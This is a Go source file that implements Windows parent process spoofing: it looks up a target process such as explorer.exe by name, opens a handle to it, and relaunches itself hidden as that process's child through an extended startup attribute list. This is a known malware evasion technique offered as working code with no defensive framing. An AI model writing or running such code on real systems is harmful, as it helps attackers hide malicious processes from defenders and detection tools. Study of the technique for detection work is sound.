package main

import (
	"syscall"
	"unsafe"
	"os"
)

// Windows API constants and types
const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
	CREATE_NO_WINDOW                     = 0x08000000
)

type STARTUPINFOEX struct {
	StartupInfo syscall.StartupInfo
	AttributeList uintptr
}

// Parent Process Spoofing: Relaunch self as child of target process (e.g., explorer.exe)
func spoofParent(targetProcess string) bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	
	createProcess := kernel32.NewProc("CreateProcessW")
	initializeProcThreadAttributeList := kernel32.NewProc("InitializeProcThreadAttributeList")
	updateProcThreadAttribute := kernel32.NewProc("UpdateProcThreadAttribute")
	openProcess := kernel32.NewProc("OpenProcess")
	
	// 1. Find target process ID
	pid := getPID(targetProcess)
	if pid == 0 {
		return false
	}
	
	// 2. Open handle to parent process
	const PROCESS_CREATE_PROCESS = 0x0080
	parentHandle, _, _ := openProcess.Call(
		uintptr(PROCESS_CREATE_PROCESS),
		0,
		uintptr(pid),
	)
	if parentHandle == 0 {
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(parentHandle))
	
	// 3. Initialize Attribute List
	var size uintptr
	initializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)))
	
	attributeList := make([]byte, size)
	ret, _, _ := initializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(&attributeList[0])),
		1,
		0,
		uintptr(unsafe.Pointer(&size)),
	)
	if ret == 0 {
		return false
	}
	
	// 4. Update Attribute List with Parent Process Handle
	ret, _, _ = updateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(&attributeList[0])),
		0,
		uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
		uintptr(unsafe.Pointer(&parentHandle)),
		unsafe.Sizeof(parentHandle),
		0,
		0,
	)
	if ret == 0 {
		return false
	}
	
	// 5. Create Process
	var si STARTUPINFOEX
	si.StartupInfo.Cb = uint32(unsafe.Sizeof(si))
	si.AttributeList = uintptr(unsafe.Pointer(&attributeList[0]))
	
	var pi syscall.ProcessInformation
	
	cmdLine, _ := syscall.UTF16PtrFromString(os.Args[0])
	
	ret, _, _ = createProcess.Call(
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0,
		0,
		1, // Inherit handles
		uintptr(EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	
	return ret != 0
}

// Helper to get PID by name
func getPID(name string) uint32 {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer syscall.CloseHandle(snapshot)
	
	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	
	if err = syscall.Process32First(snapshot, &pe32); err != nil {
		return 0
	}
	
	for {
		szExeFile := syscall.UTF16ToString(pe32.ExeFile[:])
		if szExeFile == name {
			return pe32.ProcessID
		}
		if err = syscall.Process32Next(snapshot, &pe32); err != nil {
			break
		}
	}
	return 0
}
